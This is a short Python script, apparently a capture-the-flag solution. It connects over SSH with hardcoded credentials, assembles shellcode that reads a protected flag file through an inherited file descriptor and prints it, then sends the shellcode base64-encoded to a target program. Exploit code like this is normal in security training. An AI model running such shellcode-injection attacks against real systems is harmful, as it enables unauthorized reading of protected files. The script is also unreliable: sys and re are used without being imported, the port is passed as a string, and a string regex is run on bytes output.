import os
import paramiko
from base64 import b64encode
from pwn import asm, context

ssh = paramiko.SSHClient()
ssh.connect(sys.argv[1], port=sys.argv[2], username='hacker', password='hacker')

context.arch = 'amd64'

shellcode = '''
mov rdi, 3
mov rsi, 0x1234500
mov rdx, 0x100
mov rax, 0x0
syscall

mov rdi, 1
mov rsi, 0x1234500
mov rdx, 0x100
mov rax, 0x1
syscall
'''

payload = asm(shellcode)
payload = b64encode(payload)

stdin, stdout, stderr = ssh.exec_command('echo %s | base64 -d | payload 3< /flag' % payload)

output = stdout.read()
flag = re.findall('^FLAG{[0-9a-zA-Z_]+}$', output)[0]
print(flag)
